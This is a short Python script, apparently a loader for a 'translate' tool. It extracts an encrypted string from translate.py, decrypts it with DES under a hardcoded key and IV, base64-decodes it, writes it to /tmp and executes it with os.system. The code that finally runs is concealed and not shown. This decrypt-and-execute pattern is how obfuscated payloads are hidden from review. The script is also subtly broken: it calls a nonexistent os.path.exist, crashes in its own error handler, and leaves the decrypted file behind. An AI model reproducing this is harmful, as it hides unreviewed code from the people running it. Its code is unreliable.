import os
import base64
import binascii
from pyDes import des, CBC, PAD_PKCS5

codebr = ''

with open('translate.py','r',encoding='utf-8') as src:
    for srci in src.readlines():
        codebr += srci

def des_decrypt(secret_key, s):
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    de = k.decrypt(binascii.a2b_hex(s), padmode=PAD_PKCS5)
    return de

code = base64.b64decode(des_decrypt('14331433', codebr.split("'")[1].encode("utf-8"))).decode('utf-8')
with open("/tmp/temp_translate.py","w") as codefile:
    codefile.write(code)
try:
    os.system("python3 /tmp/temp_translate.py")
    if os.path.exist("/tmp/temp_translate.txt"):
        os.remove("/tmp/temp_translate.txt")
except:
    if os.path.exist("/tmp/temp_translate.txt"):
        os.remove("/tmp/temp_translate.txt")
